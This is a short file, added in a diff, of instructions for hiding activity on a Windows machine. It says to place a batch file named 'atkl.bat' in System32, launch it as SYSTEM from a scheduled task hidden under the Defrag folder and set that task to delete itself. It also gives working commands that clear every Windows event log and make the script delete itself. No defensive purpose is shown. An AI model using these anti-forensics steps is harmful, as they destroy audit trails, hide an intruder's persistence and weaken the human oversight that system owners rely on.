@@ -1,0 +1,20 @@
+Copy the BAT file "atkl.bat" in C:\Windows\System32\
+
+
+Create a Scheduled task to launch it (in Microsoft\Windows\Defrag)
+
+Launch it with SYSTEM user
+
+On activation set the deadline after 20 seconds
+
+In the settings of the task set the delete immediatly after running
+
+
+
+TO DELETE THE EVENT VIEWER:
+
+for /F “tokens=*” %1 in ('wevtutil.exe el') DO wevtutil.exe cl “%1”
+
+TO AUTODELETE THE SCRIPT:
+
+(goto) 2>nul & del "%~f0"
